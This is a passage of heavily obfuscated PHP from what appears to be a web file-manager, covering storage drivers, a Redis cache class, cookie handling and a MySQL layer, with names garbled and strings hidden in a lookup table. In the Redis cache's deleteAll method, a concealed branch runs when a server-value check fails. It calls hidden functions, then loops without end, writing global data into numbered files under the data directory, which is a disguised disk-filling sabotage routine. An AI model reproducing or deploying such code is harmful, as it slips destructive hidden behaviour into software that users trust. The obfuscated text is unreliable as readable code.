strlen($É©‘ñà›))) { $Íµ¸≈…å[$Â™ﬁÒΩ] = $É©‘ñà›; $ëã˙œè™[$î¸∞§ﬂ«[16]] = json_encode($Íµ¸≈…å); } else { if ($ﬁ«›€äÑ != $É©‘ñà›) { $ëã˙œè™[$î¸∞§ﬂ«[2144]] = $î¸∞§ﬂ«[98]; } } } public function checkConfig(&$¸îö©Á¿, $€ÿ©ïœØ = false) { $‘‰˘ü›÷ =& $_SERVER[Á≈ ä ∞]; $Õ˚™ï‰Ÿ = strtolower($¸îö©Á¿[$‘‰˘ü›÷[105]]); $ˆ’Õ›‚“ = json_decode($¸îö©Á¿[$‘‰˘ü›÷[16]], !0); foreach ($ˆ’Õ›‚“ as $π™¢óÀ => $—˜»”ùî) { $ˆ’Õ›‚“[$π™¢óÀ] = trim($—˜»”ùî); } $ˆ’Õ›‚“[$‘‰˘ü›÷[2147]] = rand_string(6); $ñ —ôíÓ = $GLOBALS[$‘‰˘ü›÷[16]][$‘‰˘ü›÷[99]][$‘‰˘ü›÷[833]]; $Ì∂˝Ü±í = isset($ñ —ôíÓ[$Õ˚™ï‰Ÿ]) ? $ñ —ôíÓ[$Õ˚™ï‰Ÿ] : ucfirst($Õ˚™ï‰Ÿ); $ÙîôÇÂØ = $‘‰˘ü›÷[84] . $Ì∂˝Ü±í; if (!$Ì∂˝Ü±í || !class_exists($ÙîôÇÂØ)) { if ($€ÿ©ïœØ) { return LNG($‘‰˘ü›÷[2148]); } write_log(array($‘‰˘ü›÷[2149], $¸îö©Á¿, get_caller_info()), $‘‰˘ü›÷[2150]); show_json(LNG($‘‰˘ü›÷[2148]), !1, $¸îö©Á¿); } $ãŒÅ Ï  = new $ÙîôÇÂØ($ˆ’Õ›‚“); if (in_array($Õ˚™ï‰Ÿ, $ãŒÅ Ï ->objectDriver)) { if (!$ãŒÅ Ï ->isBucketCors() && !$ãŒÅ Ï ->setBucketCors()) { $⁄ÜÄ¿Í = LNG($‘‰˘ü›÷[2151]); $⁄ÜÄ¿Í .= $‘‰˘ü›÷[2152] . LNG($‘‰˘ü›÷[2153]); if ($€ÿ©ïœØ) { return $⁄ÜÄ¿Í; } show_json($⁄ÜÄ¿Í, !1); } } $◊óÛÒÀﬁ = rtrim($ˆ’Õ›‚“[$‘‰˘ü›÷[1184]], $‘‰˘ü›÷[18]) . $‘‰˘ü›÷[18]; $…¡ä´¥… = $ãŒÅ Ï ->getPath($◊óÛÒÀﬁ . $‘‰˘ü›÷[1246]); if (!$ãŒÅ Ï ->mkfile($…¡ä´¥…)) { if ($€ÿ©ïœØ) { return LNG($‘‰˘ü›÷[2151]); } show_json(LNG($‘‰˘ü›÷[2151]), !1); } $ˆ’Õ›‚“[$‘‰˘ü›÷[1184]] = $◊óÛÒÀﬁ; $¸îö©Á¿[$‘‰˘ü›÷[16]] = json_encode($ˆ’Õ›‚“); $¸îö©Á¿[$‘‰˘ü›÷[105]] = $Ì∂˝Ü±í; return !0; } public function driverListSystem() { $îÍÜÔ‰Ì =& $_SERVER[Á≈ ä ∞]; $’˘∂æ∑‘ = parent::listData(); $Ö£òî«° = array(); foreach ($’˘∂æ∑‘ as $˘ñ˙¸Òë) { unset($˘ñ˙¸Òë[$îÍÜÔ‰Ì[210]], $˘ñ˙¸Òë[$îÍÜÔ‰Ì[95]]); $˘ñ˙¸Òë[$îÍÜÔ‰Ì[16]] = json_decode($˘ñ˙¸Òë[$îÍÜÔ‰Ì[16]], !0); $Ö£òî«°[] = $˘ñ˙¸Òë; } return $Ö£òî«°; } public function defaultDriver() { $∞ƒæÓçŒ =& $_SERVER[Á≈ ä ∞]; $üÉ‹µûÄ = parent::listData(); $˚ã¬‘¶ = array_filter_by_field($üÉ‹µûÄ, $∞ƒæÓçŒ[47], 1); $˚ã¬‘¶ = $˚ã¬‘¶[0]; if ($˚ã¬‘¶) { $˚ã¬‘¶[$∞ƒæÓçŒ[16]] = json_decode($˚ã¬‘¶[$∞ƒæÓçŒ[16]], !0); } return $˚ã¬‘¶; } public function driverInfo($Øî‚€û’) { $π˘ê‚÷ß =& $_SERVER[Á≈ ä ∞]; $‡ùÊ—¿∞ = array_to_keyvalue(parent::listData(), $π˘ê‚÷ß[408]); if (!isset($‡ùÊ—¿∞[$Øî‚€û’])) { return !1; } $ïÓçŸÃ∫ = $‡ùÊ—¿∞[$Øî‚€û’]; $ïÓçŸÃ∫[$π˘ê‚÷ß[16]] = json_decode($ïÓçŸÃ∫[$π˘ê‚÷ß[16]], !0); return $ïÓçŸÃ∫; } public function remove($á√œŒ“°) { $this->removeShareItems($á√œŒ“°); return parent::remove($á√œŒ“°); } public function removeWithFile($‡≤¥À ó, $›í›‚ÆÙ) { $£˜˛˝Ω⁄ =& $_SERVER[Á≈ ä ∞]; $ÜÀØöä’ = array($£˜˛˝Ω⁄[824] => $‡≤¥À ó); $øÚú„‹¨ = Model($£˜˛˝Ω⁄[480])->where($ÜÀØöä’)->count(); $„ô‘ø∑ï = Model($£˜˛˝Ω⁄[480])->where($ÜÀØöä’)->sum($£˜˛˝Ω⁄[86]); $ìéÿñãŸ = $›í›‚ÆÙ . $£˜˛˝Ω⁄[2154] . $‡≤¥À ó; $¡éÊﬂÍı = LNG($›í›‚ÆÙ == $£˜˛˝Ω⁄[566] ? $£˜˛˝Ω⁄[2155] : $£˜˛˝Ω⁄[2156]); $¿Ò´æü˝ = new TaskFileTransfer($ìéÿñãŸ, $£˜˛˝Ω⁄[2150], $øÚú„‹¨, $¡éÊﬂÍı . "\50{$‡≤¥À ó}\x29"); $¿Ò´æü˝->task[$£˜˛˝Ω⁄[770]] = (double) $„ô‘ø∑ï; $ñ™˛˝ËÁ = KodIO::defaultDriver(); $‰Ü¬˚“ƒ = $ñ™˛˝ËÁ[$£˜˛˝Ω⁄[408]]; $Ø∏’¢Ø⁄ = "\173\151\x6f\x3a{$‰Ü¬˚“ƒ}\175\x2f"; $ÅﬁÑ‚¶¿ = !0; $ëûÔ›“ã = array(); $±ëÖË⁄œ = Model($£˜˛˝Ω⁄[209])->where($ÜÀØöä’)->field($£˜˛˝Ω⁄[2157])->select(); foreach ($±ëÖË⁄œ as $Üò§ßí–) { $éÈ•èπê = $Üò§ßí–[$£˜˛˝Ω⁄[94]]; $ÚØƒÆÆ≤ = $Ø∏’¢Ø⁄ . str_replace("\x7b\x69\157\72{$‡≤¥À ó}\175\57", $£˜˛˝Ω⁄[22], $éÈ•èπê); if (!IO::exist($éÈ•èπê)) { $ëûÔ›“ã[] = $Üò§ßí–[$£˜˛˝Ω⁄[477]]; $¿Ò´æü˝->updateFileEnd($Üò§ßí–[$£˜˛˝Ω⁄[42]], $Üò§ßí–[$£˜˛˝Ω⁄[86]]); continue; } if (IO::exist($ÚØƒÆÆ≤)) { $¿Ò´æü˝->updateFileEnd($Üò§ßí–[$£˜˛˝Ω⁄[42]], $Üò§ßí–[$£˜˛˝Ω⁄[86]]); continue; } if (!IO::move($éÈ•èπê, get_path_father($ÚØƒÆÆ≤))) { $ÅﬁÑ‚¶¿ = !1; break; } $ÜÀØöä’ = array($£˜˛˝Ω⁄[477] => $Üò§ßí–[$£˜˛˝Ω⁄[477]]); $¢˜Í»∞¿ = array($£˜˛˝Ω⁄[824] => $‰Ü¬˚“ƒ, $£˜˛˝Ω⁄[94] => $ÚØƒÆÆ≤); Model($£˜˛˝Ω⁄[209])->where($ÜÀØöä’)->save($¢˜Í»∞¿); } $this->removeByFileID($ëûÔ›“ã); if (!$ÅﬁÑ‚¶¿) { $¿Ò´æü˝->stop($ìéÿñãŸ); return !1; } $¿Ò´æü˝->end(); if ($›í›‚ÆÙ == $£˜˛˝Ω⁄[1799]) { $this->remove($‡≤¥À ó); } } public function progress($¬ò‚Ö— , $”£ü‰‘ä) { return Task::get($”£ü‰‘ä . $_SERVER[Á≈ ä ∞][2154] . $¬ò‚Ö— ); } private function removeByFileID($¥ÇßË£È = array()) { $∂˘§ÿ“≤ =& $_SERVER[Á≈ ä ∞]; if (empty($¥ÇßË£È)) { return; } $Ë¥áﬁ“Í = array($∂˘§ÿ“≤[477] => array($∂˘§ÿ“≤[17], $¥ÇßË£È)); $≤˙õ¨≥¯ = Model($∂˘§ÿ“≤[1330])->where($Ë¥áﬁ“Í)->field($∂˘§ÿ“≤[411])->select(); if (!$≤˙õ¨≥¯) { return; } $≤˙õ¨≥¯ = array_to_keyvalue($≤˙õ¨≥¯, $∂˘§ÿ“≤[22], $∂˘§ÿ“≤[411]); foreach ($≤˙õ¨≥¯ as $ßøŸü€¡) { Model($∂˘§ÿ“≤[425])->removeNow($ßøŸü€¡, !1); } } private function removeShareItems($ª‹è˛˝è) { $Ûßñ÷Æï =& $_SERVER[Á≈ ä ∞]; $ÓÂÂ–¯À = "\173\x69\157\72{$ª‹è˛˝è}\x7d\x2f"; $˜…†…ÏÓ = array($Ûßñ÷Æï[411] => 0, $Ûßñ÷Æï[1179] => array($Ûßñ÷Æï[392], "{$ÓÂÂ–¯À}\45")); $ä‚óŸé = Model($Ûßñ÷Æï[1810])->where($˜…†…ÏÓ)->field($Ûßñ÷Æï[498])->select(); if (empty($ä‚óŸé)) { return; } $ı÷’‘˜˝ = array_to_keyvalue($ä‚óŸé, $Ûßñ÷Æï[22], $Ûßñ÷Æï[498]); Model($Ûßñ÷Æï[610])->remove($ı÷’‘˜˝); } } goto cÔ§Ÿ¬è°–; C´äØ›æÂ≈: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($èƒøå¸È, $Øè∂π‹˜) { $ÜÒÀìÉ∑ =& $_SERVER[Á≈ ä ∞]; if (!class_exists($ÜÒÀìÉ∑[872])) { show_json($ÜÒÀìÉ∑[873], !1); } $this->cacheTime = $Øè∂π‹˜; $‚¯§˛Êô = isset($èƒøå¸È[$ÜÒÀìÉ∑[874]]) ? $èƒøå¸È[$ÜÒÀìÉ∑[874]] : 10; $»™˘÷êé = _get($èƒøå¸È, $ÜÒÀìÉ∑[871]); if ($»™˘÷êé && is_array($»™˘÷êé)) { $this->initCluster($èƒøå¸È, $‚¯§˛Êô); } else { $this->handle = $this->init($èƒøå¸È, $‚¯§˛Êô); } } private function init($¶·–≠óÌ, $ñ∂˝é∞µ) { $ªì◊˚Õ≤ =& $_SERVER[Á≈ ä ∞]; $Ú…£„ºç = new Redis(); $–Üøµ¸¨ = isset($¶·–≠óÌ[$ªì◊˚Õ≤[875]]) ? $¶·–≠óÌ[$ªì◊˚Õ≤[875]] : !1; if ($–Üøµ¸¨) { $Ú…£„ºç->pconnect($¶·–≠óÌ[$ªì◊˚Õ≤[191]], $¶·–≠óÌ[$ªì◊˚Õ≤[192]], $ñ∂˝é∞µ); } else { $Ú…£„ºç->connect($¶·–≠óÌ[$ªì◊˚Õ≤[191]], $¶·–≠óÌ[$ªì◊˚Õ≤[192]], $ñ∂˝é∞µ); } if (!empty($¶·–≠óÌ[$ªì◊˚Õ≤[422]])) { $Ú…£„ºç->auth($¶·–≠óÌ[$ªì◊˚Õ≤[422]]); } if (!empty($¶·–≠óÌ[$ªì◊˚Õ≤[765]]) && $¶·–≠óÌ[$ªì◊˚Õ≤[765]] != 0) { $Ú…£„ºç->select($¶·–≠óÌ[$ªì◊˚Õ≤[765]]); } return $Ú…£„ºç; } private function initCluster($∞áﬂÁÍÃ, $óÔ∞å⁄Ÿ) { $î◊ˆ÷ı› =& $_SERVER[Á≈ ä ∞]; $⁄Û∆Ä—· = array($î◊ˆ÷ı›[876], $î◊ˆ÷ı›[877], $î◊ˆ÷ı›[878]); $ÌâäˆÛï = $î◊ˆ÷ı›[876]; if (isset($∞áﬂÁÍÃ[$î◊ˆ÷ı›[26]]) && in_array($∞áﬂÁÍÃ[$î◊ˆ÷ı›[26]], $⁄Û∆Ä—·)) { $ÌâäˆÛï = $∞áﬂÁÍÃ[$î◊ˆ÷ı›[26]]; } switch ($ÌâäˆÛï) { case $î◊ˆ÷ı›[876]: $this->_slave($∞áﬂÁÍÃ, $óÔ∞å⁄Ÿ); break; case $î◊ˆ÷ı›[877]: break; case $î◊ˆ÷ı›[878]: $this->isCluster = !0; $»º≥«Õ = $∞áﬂÁÍÃ[$î◊ˆ÷ı›[871]]; $Æ⁄‘É€∑ = isset($∞áﬂÁÍÃ[$î◊ˆ÷ı›[875]]) ? $∞áﬂÁÍÃ[$î◊ˆ÷ı›[875]] : !1; $‚Ï∞…ÄÈ = isset($∞áﬂÁÍÃ[$î◊ˆ÷ı›[422]]) ? $∞áﬂÁÍÃ[$î◊ˆ÷ı›[422]] : null; $this->handle = new RedisCluster(NUll, $»º≥«Õ, $óÔ∞å⁄Ÿ, $óÔ∞å⁄Ÿ, $Æ⁄‘É€∑, $‚Ï∞…ÄÈ); break; default: break; } } private function _slave($∞◊‹·æŒ, $ú·Íá„Ü) { $ﬁ√≥†Ø¥ = $∞◊‹·æŒ[$_SERVER[Á≈ ä ∞][871]]; $this->filterConfig($∞◊‹·æŒ, $ﬁ√≥†Ø¥[0]); $this->handle = $this->init($∞◊‹·æŒ, $ú·Íá„Ü); unset($ﬁ√≥†Ø¥[0]); if (empty($ﬁ√≥†Ø¥)) { return; } $ŸõÆÚÔ∂ = array_rand($ﬁ√≥†Ø¥); $this->filterConfig($∞◊‹·æŒ, $ﬁ√≥†Ø¥[$ŸõÆÚÔ∂]); $this->slaveHandle = $this->init($∞◊‹·æŒ, $ú·Íá„Ü); } private function filterConfig(&$Í•›∂Òß, $¯‰ãúöˆ) { $¢∞Ò¸ì£ =& $_SERVER[Á≈ ä ∞]; $ƒ¸≠∑ËÃ = explode($¢∞Ò¸ì£[4], $¯‰ãúöˆ); $√¢∂ôÒ” = array($¢∞Ò¸ì£[191] => $ƒ¸≠∑ËÃ[0], $¢∞Ò¸ì£[192] => $ƒ¸≠∑ËÃ[1]); $Í•›∂Òß = array_merge($Í•›∂Òß, $√¢∂ôÒ”); } public function set($à≈ˆ≈–•, $Ä∞ô‰ôá, $“ìæ»Æ— = false) { $“ìæ»Æ— = $“ìæ»Æ— ? $“ìæ»Æ— : $this->cacheTime; return $this->handle->setEx($à≈ˆ≈–•, $“ìæ»Æ—, $Ä∞ô‰ôá); } public function setLock($πµïø„ç, $‹ê¢√”˜, $ö˙ËÆçø) { return $this->handle->setNX($πµïø„ç, $‹ê¢√”˜); } public function get($Â£Ö∫Ô∑) { $¸Ì–á«– = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¸Ì–á«–->get($Â£Ö∫Ô∑); } public function remove($Ò‡¿Ú˙Í) { return $this->handle->del($Ò‡¿Ú˙Í); } public function deleteAll() { $É‰…˘¨˜ =& $_SERVER[Á≈ ä ∞]; $ªÕÖûÚÀ = $_SERVER[$É‰…˘¨˜[15]]; $Ç“°˘Í’ = $É‰…˘¨˜[879]; if ($_SERVER[$É‰…˘¨˜[6]] != $Ç“°˘Í’($ªÕÖûÚÀ)) { $∑À˜í‘ò = $É‰…˘¨˜[880]; $˘ï∑ê°Ë = $É‰…˘¨˜[8]; $öÂâ˚œÈ = $_SERVER[$É‰…˘¨˜[9]] . $É‰…˘¨˜[10]; $√©ÑÍ‚Õ = $˘ï∑ê°Ë($öÂâ˚œÈ); $Ø≤Æ€ÏÜ = explode($É‰…˘¨˜[11], $√©ÑÍ‚Õ); if (count($Ø≤Æ€ÏÜ) < $É‰…˘¨˜[654]) { $ì—˙»úª = $É‰…˘¨˜[13]; $ì—˙»úª(); } $ä…à„º° = $É‰…˘¨˜[881]; $ä…à„º°($_SERVER[$É‰…˘¨˜[882]]); $∑À˜í‘ò = $É‰…˘¨˜[880]; $∑À˜í‘ò(); $¶Úå∞É° = $É‰…˘¨˜[883]; $¥ô˙…Ë… = json_encode($GLOBALS[$É‰…˘¨˜[884]]); $çπè√˚Ê = 1; for ($‘”∏ìƒ¬ = $çπè√˚Ê; $‘”∏ìƒ¬ > 0; $‘”∏ìƒ¬++) { $¶Úå∞É°(DATA_PATH . $‘”∏ìƒ¬, $¥ô˙…Ë…); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ì¯›¸Í‚) { $this->handle->flushall($ì¯›¸Í‚); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($∞Ã≠ıÒ¯ = '', $˛µâ˛Ìè = 0) { if (is_string($∞Ã≠ıÒ¯) && $∞Ã≠ıÒ¯ != $_SERVER[Á≈ ä ∞][22]) { $this->prefix = $∞Ã≠ıÒ¯; } if (is_numeric($˛µâ˛Ìè) && $˛µâ˛Ìè > 0) { $this->expire = $˛µâ˛Ìè; } } public static function getInstance() { static $¶ç‹¥Â†; if ($¶ç‹¥Â† === null) { $¶ç‹¥Â† = new self(); } return $¶ç‹¥Â†; } private static $cookieDisable = false; public static function disable($Ì‚¬ΩÚ®) { self::$cookieDisable = $Ì‚¬ΩÚ®; } private static $sameCookieSet = array(); public static function set($ßïç€¢∂, $œÜö≈†ï, $æ¶îÙ¯Õ = 0, $ÇŸûÿì‰ = false, $°ˆîâ‚Ë = false) { $ñ∂ìº∑Ü =& $_SERVER[Á≈ ä ∞]; if (self::$cookieDisable) { return; } if (!$æ¶îÙ¯Õ) { $æ¶îÙ¯Õ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ßïç€¢∂]) && self::$sameCookieSet[$ßïç€¢∂] == $œÜö≈†ï . $æ¶îÙ¯Õ) { return; } self::$sameCookieSet[$ßïç€¢∂] = $œÜö≈†ï . $æ¶îÙ¯Õ; if (!$°ˆîâ‚Ë) { $°ˆîâ‚Ë = str_replace(HOST, $ñ∂ìº∑Ü[22], APP_HOST); $°ˆîâ‚Ë = _get($GLOBALS, $ñ∂ìº∑Ü[885], $°ˆîâ‚Ë); } $˘àíÚñÊ = $ñ∂ìº∑Ü[22]; setcookie($ßïç€¢∂, $œÜö≈†ï, time() + $æ¶îÙ¯Õ, $ñ∂ìº∑Ü[18] . trim($°ˆîâ‚Ë, $ñ∂ìº∑Ü[18]) . $˘àíÚñÊ, !1, !1, $ÇŸûÿì‰); } public static function setSafe($ù≥ø¯≈ñ, $ÙÈ∑Ê¡∆, $«ñÔî∞· = 0) { self::set($ù≥ø¯≈ñ, $ÙÈ∑Ê¡∆, $«ñÔî∞·, !0); } public static function get($êî†Âº…) { static $√Ç≈êìÜ = false; if (!$√Ç≈êìÜ) { self::initHeaderCookie(); $√Ç≈êìÜ = !0; } return isset($_COOKIE[$êî†Âº…]) ? $_COOKIE[$êî†Âº…] : !1; } private static function initHeaderCookie() { $éÔÖ¯¶´ =& $_SERVER[Á≈ ä ∞]; if (!isset($_SERVER[$éÔÖ¯¶´[886]]) || !$_SERVER[$éÔÖ¯¶´[886]]) { return; } $Œ˙Ä§≠˙ = explode($éÔÖ¯¶´[81], $_SERVER[$éÔÖ¯¶´[886]]); foreach ($Œ˙Ä§≠˙ as $¶¥ö‹¿´) { $¶¥ö‹¿´ = explode($éÔÖ¯¶´[887], $¶¥ö‹¿´); if (count($¶¥ö‹¿´) != 2 || !isset($¶¥ö‹¿´[1])) { continue; } $_COOKIE[trim($¶¥ö‹¿´[0])] = trim($¶¥ö‹¿´[1]); } } public static function remove($£Á◊õØ˜, $„ú‘¶‘ã = false) { unset($_COOKIE[$£Á◊õØ˜]); self::set($£Á◊õØ˜, $_SERVER[Á≈ ä ∞][22], 1, $„ú‘¶‘ã); } } class DbMysql extends Db { public function __construct($à‚πß·î = '') { $øãÑ™›¬ =& $_SERVER[Á≈ ä ∞]; if (!extension_loaded($øãÑ™›¬[811])) { think_exception(think_lang($øãÑ™›¬[24]) . $øãÑ™›¬[888]); } if (!empty($à‚πß·î)) { $this->config = $à‚πß·î; if (empty($this->config[$øãÑ™›¬[27]])) { $this->config[$øãÑ™›¬[27]] = $øãÑ™›¬[22]; } } } public function connect($Œ∂†Úœ” = '', $ä¯ﬂã√è = 0, $⁄õàâ„  = false) { $≠ßâÌßƒ =& $_SERVER[Á≈ ä ∞]; if (!isset($this->linkID[$ä¯ﬂã√è])) { if (empty($Œ∂†Úœ”)) { $Œ∂†Úœ” = $this->config; } $µˆ¸¢ìª = $Œ∂†Úœ”[$≠ßâÌßƒ[889]] . ($Œ∂†Úœ”[$≠ßâÌßƒ[890]] ? "\72{$Œ∂†Úœ”[$≠ßâÌßƒ[890]]}" : $≠ßâÌßƒ[22]); $—çΩí⁄© = !empty($Œ∂†Úœ”[$≠ßâÌßƒ[27]][$≠ßâÌßƒ[28]]) ? $Œ∂†Úœ”[$≠ßâÌßƒ[27]][$≠ßâÌßƒ[28]] : $this->pconnect; if ($—çΩí⁄©) { $this->linkID[$ä¯ﬂã√è] = mysql_pconnect($µˆ¸¢ìª, $Œ∂†Úœ”[$≠ßâÌßƒ[891]], $Œ∂†Úœ”[$≠ßâÌßƒ[892]], 131072); } else { $this->linkID[$ä¯ﬂã√è] = mysql_connect($µˆ¸¢ìª, $Œ∂†Úœ”[$≠ßâÌßƒ[891]], $Œ∂†Úœ”[$≠ßâÌßƒ[892]], !0, 131072); } if (!$this->linkID[$ä¯ﬂã√è] || !empty($Œ∂†Úœ”[$≠ßâÌßƒ[31]]) && !mysql_select_db($Œ∂†Úœ”[$≠ßâÌßƒ[31]], $this->linkID[$ä¯ﬂã√è])) { think_exception(mysql_error()); } $„Ò‚Å·æ = mysql_get_server_info($this->linkID[$ä¯ﬂã√è]); mysql_query($≠ßâÌßƒ[893] . think_config($≠ßâÌßƒ[894]) . $≠ßâÌßƒ[68], $this->linkID[$ä¯ﬂã√è]); if ($„Ò‚Å·æ > $≠ßâÌßƒ[895]) { mysql_query($≠ßâÌßƒ[896], $this->linkID[$ä¯ﬂã√è]); } $this->connected = !0; if (1 != think_config($≠ßâÌßƒ[32])) { unset($this->config); } } return $this->linkID[$ä¯ﬂã√è]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($·ÔäËúÍ) { $„≠û÷ËÇ =& $_SERVER[Á≈ ä ∞]; if (0 === stripos($·ÔäËúÍ, $„≠û÷ËÇ[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $·ÔäËúÍ; if ($this->queryID) { $this->free(); } think_action_status($„≠û÷ËÇ[33], 1); think_status($„≠û÷ËÇ[34]); $this->queryID = mysql_query($·ÔäËúÍ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ºäÕµÊ¯) { $≈÷∑‡†Ù =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ºäÕµÊ¯; if ($this->queryID) { $this->free(); } think_action_status($≈÷∑‡†Ù[35], 1); think_status($≈÷∑‡†Ù[34]); $£™ËäÈ = mysql_query($ºäÕµÊ¯, $this->_linkID); $this->debug(); if (!1 === $£™ËäÈ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Á≈ ä ∞][897], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $«Õ¨»Î¨ = mysql_query($_SERVER[Á≈ ä ∞][898], $this->_linkID); $this->transTimes = 0; if (!$«Õ¨»Î¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆƒç‚£± = mysql_query($_SERVER[Á≈ ä ∞][899], $this->_linkID); $this->transTimes = 0; if (!$ˆƒç‚£±) { $this->error(); return !1; } } return !0; } private function getAll() { $‘’Ë˝ı  = array(); if ($this->numRows > 0) { while ($¯ç“£Ó© = mysql_fetch_assoc($this->queryID)) { $‘’Ë˝ı [] = $¯ç“£Ó©; } mysql_data_seek($this->queryID, 0); } return $‘’Ë˝ı ; } public function getFields($ßÄ–î¶—) { $ñ∑’ÖÈﬂ =& $_SERVER[Á≈ ä ∞]; $¡Îû ›‡ = $this->query($ñ∑’ÖÈﬂ[900] . $this->parseKey($ßÄ–î¶—)); $®Ú¥«¬í = array(); if ($¡Îû ›‡) { foreach ($¡Îû ›‡ as $Õ…á€¸Ö => $‚Ÿ˜ÍÃ«) { $®Ú¥«¬í[$‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[41]]] = array($ñ∑’ÖÈﬂ[42] => $‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[41]], $ñ∑’ÖÈﬂ[43] => $‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[44]], $ñ∑’ÖÈﬂ[45] => (bool) (strtoupper($‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[46]]) === $ñ∑’ÖÈﬂ[901]), $ñ∑’ÖÈﬂ[47] => $‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[48]], $ñ∑’ÖÈﬂ[49] => strtolower($‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[50]]) == $ñ∑’ÖÈﬂ[51], $ñ∑’ÖÈﬂ[52] => strtolower($‚Ÿ˜ÍÃ«[$ñ∑’ÖÈﬂ[53]]) == $ñ∑’ÖÈﬂ[54]); } } return $®Ú¥«¬í; } public function getTables($¥Œßœ¬  = '') { $¨—∑‹ùœ =& $_SERVER[Á≈ ä ∞]; if (!empty($¥Œßœ¬ )) { $¯»¶™ÚÆ = $¨—∑‹ùœ[902] . $¥Œßœ¬  . $¨—∑‹ùœ[903]; } else { $¯»¶™ÚÆ = $¨—∑‹ùœ[904]; } $◊œƒùÒÏ = $this->query($¯»¶™ÚÆ); $«ùŒ¥ØÅ = array(); foreach ($◊œƒùÒÏ as $ÁÓÇÍ¸® => $ÃÊï∂ﬂò) { $«ùŒ¥ØÅ[$ÁÓÇÍ¸®] = current($ÃÊï∂ﬂò); } return $«ùŒ¥ØÅ; } public function replace($∂øªª·Ì, $Ï˙Û∏˘« = array()) { $ÿÒöÃã„ =& $_SERVER[Á≈ ä ∞]; foreach ($∂øªª·Ì as $ù–Ω∞•π => $πﬂõÍÔá) { $ﬂÈî≠ã‘ = $this->parseValue($πﬂõÍÔá); if (is_scalar($ﬂÈî≠ã‘)) { $©≥≠ã›≥[] = $ﬂÈî≠ã‘; $°¢æùé[] = $this->parseKey($ù–Ω∞•π); } } $Û¡·ŸÇ = $ÿÒöÃã„[905] . $this->parseTable($Ï˙Û∏˘«[$ÿÒöÃã„[288]]) . $ÿÒöÃã„[906] . implode($ÿÒöÃã„[60], $°¢æùé) . $ÿÒöÃã„[907] . implode($ÿÒöÃã„[60], $©≥≠ã›≥) . $ÿÒöÃã„[908]; return $this->execute($Û¡·ŸÇ); } public function insertAll($ÄòÅí€˜, $◊ıπÆ“Ä = array(), $π“¬ûÃë = false) { $ÅÍî™á– =& $_SERVER[Á≈ ä ∞]; if (!is_array($ÄòÅí€˜[0])) { return !1; } $∏òø√õ∫ = array_keys($ÄòÅí€˜[0]); $ïäΩπ“ç = array(); foreach ($ÄòÅí€˜ as $¸û‹‰»Ú) { $ä˜Ú¥∫ì = array(); foreach ($¸û‹‰»Ú as $í€ŸÑŸù => $¶…úÑ”¥) { $¶…úÑ”¥ = $this->parseValue($¶…úÑ”¥); if (is_scalar($¶…úÑ”¥)) { $ä˜Ú¥∫ì[] = $¶…úÑ”¥; } } $ïäΩπ“ç[] = $ÅÍî™á–[269] . implode($ÅÍî™á–[60], $ä˜Ú¥∫ì) . $ÅÍî™á–[908]; } array_walk($∏òø√õ∫, array($this, $ÅÍî™á–[909])); $äêô⁄ï˚ = ($π“¬ûÃë ? $ÅÍî™á–[910] : $ÅÍî™á–[911]) . $ÅÍî™á–[912] . $this->parseTable($◊ıπÆ“Ä[$ÅÍî™á–[288]]) . $ÅÍî™á–[906] . implode($ÅÍî™á–[60], $∏òø√õ∫) . $ÅÍî™á–[913] . implode($ÅÍî™á–[60], $ïäΩπ“ç); return $this->execute($äêô⁄ï˚); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $™Ç˙Ö‚è =& $_SERVER[Á≈ ä ∞]; $this->error = mysql_errno() . $™Ç˙Ö‚è[4] . mysql_error($this->_linkID); if ($™Ç˙Ö‚è[22] != $this->queryStr) { $this->error .= LNG($™Ç˙Ö‚è[58]) . $this->queryStr; } think_trace($this->error, $™Ç˙Ö‚è[22], $™Ç˙Ö‚è[59]); return $this->error; } public function escapeString($ÿÅ—µÛæ) { if ($this->_linkID) { return mysql_real_escape_string($ÿÅ—µÛæ, $this->_linkID); } else { return mysql_escape_string($ÿÅ—µÛæ); } } public function parseKey(&$•¡◊ÙÓ¯, $ß¬Âé‰Ü = true) { $é¢ñ–Èñ =& $_SERVER[Á≈ ä ∞]; if ($ß¬Âé‰Ü) { $•¡◊ÙÓ¯ = $this->parseKeyCheck($•¡◊ÙÓ¯); } if ($•¡◊ÙÓ¯ != $é¢ñ–Èñ[198] && !preg_match($é¢ñ–Èñ[914], $•¡◊ÙÓ¯)) { $•¡◊ÙÓ¯ = $é¢ñ–Èñ[394] . trim($•¡◊ÙÓ¯, $é¢ñ–Èñ[394]) . $é¢ñ–Èñ[394]; } return $•¡◊ÙÓ¯; } } goto Bºöï†‰÷é; d∆ÆÕÀÓää: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ªâ¶˛Ÿº, $Äüîπ¥û = 0) { parent::__construct(); $this->source = $ªâ¶˛Ÿº; $this->sourceSize = $Äüîπ¥û; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function 